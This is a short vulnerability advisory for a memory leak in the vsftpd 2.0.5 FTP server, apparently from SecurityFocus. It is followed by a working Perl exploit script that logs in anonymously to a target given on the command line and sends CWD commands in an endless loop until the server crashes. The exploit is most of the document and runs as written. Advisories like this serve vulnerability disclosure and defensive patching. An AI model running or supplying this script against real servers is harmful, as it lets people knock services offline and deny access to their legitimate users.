source: http://www.securityfocus.com/bid/29322/info
 
 
The 'vsftpd' FTP server is prone to a remote denial-of-service vulnerability because it fails to free allocated memory.
 
Successfully exploiting this issue allows remote attackers to crash the affected application, denying service to legitimate users. 

#!/usr/bin/perl -w


#######################################################################################
#vsftpd 2.0.5 FTP Server on Red Hat Enterprise Linux (RHEL) 5, Fedora 6 to 8,
#Foresight Linux, rPath Linux is prone to Denial-of-Service(DoS) vulnerability.
#
#Can be xploited by large number of CWD commands to vsftp daemon with deny_file configuration
#option in /etc/vsftpd/vsftpd.conf or the path where FTP server is installed.
#
#I tried to modify local exploit found at securityfocus such that we can remotely exloit
#
# Author shall not bear any responsibility
#Author:Praveen Darshanam
#Email:praveen[underscore]recker[at]sify.com
#Date:07th June, 2008
#
#
########################################################################################


use Net::FTP;
$ftp=Net::FTP->new("$ARGV[0]",Debug=>0) || die "Cannot connect to Host $ARGV[0]\n Usage: $perl script_name.pl target_ip\n";
$ftp -> login("anonymous","anonymous") || die "Could not Login...Retry";

while(1)
{
#this loop runs infinitely

    $ftp -> cwd();
}

$ftp->quit;